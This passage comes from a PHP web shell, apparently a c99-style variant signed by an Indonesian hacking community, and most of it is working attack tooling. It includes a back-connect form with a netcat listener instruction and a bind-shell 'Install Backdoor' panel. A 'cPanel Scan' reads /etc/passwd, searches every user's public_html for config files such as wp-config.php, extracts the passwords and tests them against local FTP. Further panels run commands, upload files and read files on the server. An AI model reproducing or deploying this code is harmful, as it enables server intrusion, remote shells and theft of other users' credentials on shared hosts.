"HUcMr7GzBufo6Ay87Lu+ii0fAfP09AvIER8ZNjc4QSUmTogYscBaAiVFkChYyBCIiwXkZD2oR3FB".
"u4tLAgEAOw==",
"ext_txt"=>
"R0lGODlhEwAQAKIAAAAAAP///8bGxoSEhP///wAAAAAAAAAAACH5BAEAAAQALAAAAAATABAAAANJ".
"SArE3lDJFka91rKpA/DgJ3JBaZ6lsCkW6qqkB4jzF8BS6544W9ZAW4+g26VWxF9wdowZmznlEup7".
"UpPWG3Ig6Hq/XmRjuZwkAAA7",
"ext_wri"=>
"R0lGODlhEAAQADMAACH5BAEAAAgALAAAAAAQABAAg////wAAAICAgMDAwICAAAAAgAAA////AAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARRUMhJkb0C6K2HuEiRcdsAfKExkkDgBoVxstwAAypduoao".
"a4SXT0c4BF0rUhFAEAQQI9dmebREW8yXC6Nx2QI7LrYbtpJZNsxgzW6nLdq49hIBADs=",
"ext_xml"=>
"R0lGODlhEAAQAEQAACH5BAEAABAALAAAAAAQABAAhP///wAAAPHx8YaGhjNmmabK8AAAmQAAgACA".
"gDOZADNm/zOZ/zP//8DAwDPM/wAA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAVk4CCOpAid0ACsbNsMqNquAiA0AJzSdl8HwMBOUKghEApbESBUFQwABICx".
"OAAMxebThmA4EocatgnYKhaJhxUrIBNrh7jyt/PZa+0hYc/n02V4dzZufYV/PIGJboKBQkGPkEEQ".
"IQA7"
);
$imgequals = array(
  "ext_tar"=>array("ext_tar","ext_r00","ext_ace","ext_arj","ext_bz","ext_bz2","ext_tbz","ext_tbz2","ext_tgz","ext_uu","ext_xxe","ext_zip","ext_cab","ext_gz","ext_iso","ext_lha","ext_lzh","ext_pbk","ext_rar","ext_uuf"),
  "ext_php"=>array("ext_php","ext_php3","ext_php4","ext_php5","ext_phtml","ext_shtml","ext_htm"),
  "ext_jpg"=>array("ext_jpg","ext_gif","ext_png","ext_jpeg","ext_jfif","ext_jpe","ext_bmp","ext_ico","ext_tif","tiff"),
  "ext_html"=>array("ext_html","ext_htm"),
  "ext_avi"=>array("ext_avi","ext_mov","ext_mvi","ext_mpg","ext_mpeg","ext_wmv","ext_rm"),
  "ext_lnk"=>array("ext_lnk","ext_url"),
  "ext_ini"=>array("ext_ini","ext_css","ext_inf"),
  "ext_doc"=>array("ext_doc","ext_dot"),
  "ext_js"=>array("ext_js","ext_vbs"),
  "ext_cmd"=>array("ext_cmd","ext_bat","ext_pif"),
  "ext_wri"=>array("ext_wri","ext_rtf"),
  "ext_swf"=>array("ext_swf","ext_fla"),
  "ext_mp3"=>array("ext_mp3","ext_au","ext_midi","ext_mid"),
  "ext_htaccess"=>array("ext_htaccess","ext_htpasswd","ext_ht","ext_hta","ext_so")
);  

if (!$getall) {
  header("Content-type: image/gif");
  header("Cache-control: public");
  header("Expires: ".date("r",mktime(0,0,0,1,1,2030)));
  header("Cache-control: max-age=".(60*60*24*7));
  header("Last-Modified: ".date("r",filemtime(__FILE__)));
  foreach($imgequals as $k=>$v) {if (in_array($img,$v)) {$img = $k; break;}}
  if (empty($images[$img])) {$img = "small_unk";}
  if (in_array($img,$ext_tar)) {$img = "ext_tar";}
  echo base64_decode($images[$img]);
}
else {
  foreach($imgequals as $a=>$b) {foreach ($b as $d) {if ($a != $d) {if (!empty($images[$d])) {echo("Warning! Remove \$images[".$d."]<br>");}}}}
  natsort($images);
  $k = array_keys($images);
  echo  "<center>";
  foreach ($k as $u) {echo $u.":<img src=\"".$surl."x=img&img=".$u."\" border=\"1\"><br>";}
  echo "</center>";
}
exit;
}

if ($x == "konak") {
  $ip = $_SERVER["REMOTE_ADDR"];
  $msg = $_POST['backcconnmsg'];
  $emsg = $_POST['backcconnmsge'];
  echo("<center><b>[&#8224;] b3k-k0n4k [&#8224;]</b></br></br><form name=form method=POST>Host:<input type=text name=backconnectip size=15 value=$ip> Port: <input type=text name=backconnectport size=15 value=21212> Use: <select size=1 name=use><option value=Perl>PL</option></select> <input type=submit name=submit value=Connect></form>kalaian run dolo di console atw server kalaian <b>nc -lvp21212</b>, dan masukna ip sama portnya pd kedua kolom di atas. <b>baru kalian klik connectnya</b>'<br><br></center>");
  echo("$msg");
  echo("$emsg");

}

if ($x == "cP"){
	if ($_GET['go'] == 'go'){ 
    set_time_limit(0);
	##################
	@$passwd=fopen('/etc/passwd','r');
	if (!$passwd) {
	   echo "[-] Error : coudn't read /etc/passwd";
	   exit;
	}
	$path_to_public=array();
	$users=array();
	$pathtoconf=array();
	$i=0;
	
	while(!feof($passwd)) {
	  $str=fgets($passwd);
	  if ($i>35) {
		$pos=strpos($str,":");
		$username=substr($str,0,$pos);
		$dirz="/home/$username/public_html/";
		if (($username!="")) {
			if (is_readable($dirz)) {
				array_push($users,$username);
				array_push($path_to_public,$dirz);
			}
		}
	  }
	  $i++;
	}
	###################
	
	#########################
	function read_dir($path,$username) {
		if ($handle = opendir($path)) {
			while (false !== ($file = readdir($handle))) {
				  $fpath="$path$file";
				  if (($file!='.') and ($file!='..')) {
					 if (is_readable($fpath)) {
						$dr="$fpath/";
						if (is_dir($dr)) {
						   read_dir($dr,$username);
						}
						else {
							 if (($file=='config.php')
                        or ($file=='configuration.php')
                        or ($file=='wp-config.php')
                        or ($file=='config.inc.php')
                        or ($file=='database.php')
                        or ($file=='conf.php')
                        or ($file=='settings.php')
                        or ($file=='setting.php')
						or ($file=='inc.php')
                        or ($file=='corn.php')
                        or ($file=='configs.php')
                        or ($file=='konfig.php')
                        or ($file=='dbconf.php')
                        or ($file=='koneksi.php')
                        or ($file=='dbconfig.php')
                        or ($file=='db.inc.php')
                        or ($file=='db_connect.php')
                        or ($file=='dbconnect.php')
                        or ($file=='db-connect.php')
                        or ($file=='configure.php')
                        or ($file=='global.php')
                        or ($file=='connect.php')
                        or ($file=='db.php')
                        or ($file=='conf_db.php')
                        or ($file=='database.inc.php')
                        or ($file=='database.php')
                        or ($file=='connection.php')
                        or ($file=='connections.php')
                        or ($file=='configure.class.php')
                        or ($file=='config.class.php')
                        or ($file=='configuration.class.php')
                        or ($file=='db.class.php')
                        or ($file=='file_manager.php')
                        or ($file=='LocalSettings.php')
                        or ($file=='filemanager.php')
                        or ($file=='manager.php')
                        or ($file=='managers.php')
                        or ($file=='connect.inc.php')
                        or ($file=='dbconnect.inc.php')) 
								 {
								$pass=get_pass($fpath);
								if ($pass!='') {
								   echo "[+] $fpath\n$pass\n";
								   ftp_check($username,$pass);
								}
							 }
						}
					 }
				  }
			}
		}
	}
	
	function get_pass($link) {
		@$config=fopen($link,'r');
		while(!feof($config)) {
			$line=fgets($config);
			if (strstr($line,'pass') or strstr($line,'password') or strstr($line,'pwd') or strstr($line,'kode') or strstr($line,'mypassword') or strstr($line,'passwd')) {
				if (strrpos($line,'"'))
				   $pass=substr($line,(strpos($line,'=')+3),(strrpos($line,'"')-(strpos($line,'=')+3)));
				else
				   $pass=substr($line,(strpos($line,'=')+3),(strrpos($line,"'")-(strpos($line,'=')+3)));
				return $pass;
			}
		}
	}
	
	function ftp_check($login,$pass) {
		 @$ftp=ftp_connect('127.0.0.1');
		 if ($ftp) {
			@$res=ftp_login($ftp,$login,$pass);
			if ($res) {
			   echo '[kNa gAn] '.$login.':'.$pass."  W00t\n";
			}
			else ftp_quit($ftp);
		 }
	}
	
	echo "<br><br>";
	echo "<textarea name='main_window' cols=100 rows=20>";
	
	echo "[+] Found ".sizeof($users)." entrys in /etc/passwd\n";
	echo "[+] Found ".sizeof($path_to_public)." readable public_html directories\n";
	
	echo "[~] Searching for passwords in config.* files...\n\n";
	foreach ($users as $user) {
			$path="/home/$user/public_html/";
			read_dir($path,$user);
	}
	
	echo "\n[+] Udah\n";
	
	echo "</textarea><br>";
	}else
	echo '<center>cPanel Scan<br><a href="'.$surl.'x=cP&go=go">yupz</a> || <a href="'.$surl.'">hmm</a></center>';
}

if ($x == "sleep"){
  $msg = $_POST['backcconnmsg'];
  $emsg = $_POST['backcconnmsge'];
  echo("<center><b>Bind Shell Backdoor:</b><br><br><form name=form method=POST>
  Bind Port: <input type='text' name='backconnectport' value='21212'>
  <input type='hidden' name='use' value='sleep'>
  <input type='submit' value='Install Backdoor'></form>");
  echo("$msg");
  echo("$emsg");
  echo("</center>");
}

if ($x == "sken"){
set_time_limit(0); 

($x0b = ini_get('safe_mode') == 0) ? $x0b = 'off': die('<b>Error: Safe Mode is On</b>');

@$x0c = fopen('/etc/passwd','r');

if (!$x0c) { die('<b> Error : Can Not Read Config Of Server </b>'); }

// $x0d = array();
// $x0e = array();
// $x0f = array();
// $x10 = 0;

while(!feof($x0c)){
    // baca baris...
    // $x11 = fgets($x0c);
    // if ($x10 < 35){ 
    while($x11 = fgets($x0c)){
        
        $x12 = strpos($x11,':');

        $x13 = substr($x11,0,$x12);


        $x14 = '/home/'.$x13.'/public_html';
        if (($x13 != '')){
            
            if (is_readable($x14)){

                echo "<font face=Verdana size=2 color=#c000ff>[&#8224;] oK [&#8224;] $x14</font>";
                echo "<br/>";
            }    
        }
    }
    // $x10++;
 }
}

echo "</td></tr></table>\n";
?>
<div  class=barheader2><b> Command Panel </b></div>
<table class=mainpanel>
<?php
if (!$safemode) {
?>
<tr><td align=right>Command:</td>
<td><form method="POST">
    <input type=hidden name=x value="cmd">
    <input type=hidden name="d" value="<?php echo $dispd; ?>">
    <input type="text" name="cmd" size="50" value="<?php echo htmlspecialchars($cmd); ?>">
    <input type=hidden name="cmd_txt" value="1"> - <input type=submit name=submit value="Execute">
    </form>
</td></tr>
<tr><td align=right>Quick Commands:</td>
<td><form method="POST">
    <input type=hidden name=x value="cmd">
    <input type=hidden name="d" value="<?php echo $dispd; ?>">
    <input type=hidden name="cmd_txt" value="1">
    <select name="cmd">
    <?php
    foreach ($cmdaliases as $als) {
      echo "<option value=\"".htmlspecialchars($als[1])."\">".htmlspecialchars($als[0])."</option>";
    }
    foreach ($cmdaliases2 as $als) {
      echo "<option value=\"".htmlspecialchars($als[1])."\">".htmlspecialchars($als[0])."</option>";
    }
    ?>
    </select> -
    <input type=submit name=submit value="Execute">
    </form>
</td></tr>
<?php
}
?>
<tr><td align=right>Upload:</td>
<td><form method="POST" enctype="multipart/form-data">
    <input type=hidden name=x value="upload">
    <input type=hidden name="miniform" value="1">
    <input type="file" name="uploadfile"> - <input type=submit name=submit value="Upload"> <?php echo $wdt; ?>
    </form>
</td></tr>
<tr><td align=right>Make File:</td>
<td><form method="POST"><input type=hidden name=x value="mkfile"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type=hidden name="ft" value="edit">
    <input type="text" name="mkfile" size="70" value="<?php echo $dispd; ?>"> - <input type=submit value="Create"> <?php echo $wdt; ?>
    </form></td></tr>
<tr><td align=right>View File:</td>
<td><form method="POST"><input type=hidden name=x value="gofile"><input type=hidden name="d" value="<?php echo $dispd; ?>">
    <input type="text" name="f" size="70" value="<?php echo $dispd; ?>"> - <input type=submit value="View">
    </form></td></tr>
</table>
<div class=barheader2 colspan=2><font color=white> FULLMAGIC COMMUNITY | Indonesia HackRs <a href="http://zone-h.org/archive/notifier=bogel" target="_blank">irc.fullmagic.us.to</a>   </font></div>
</body></html>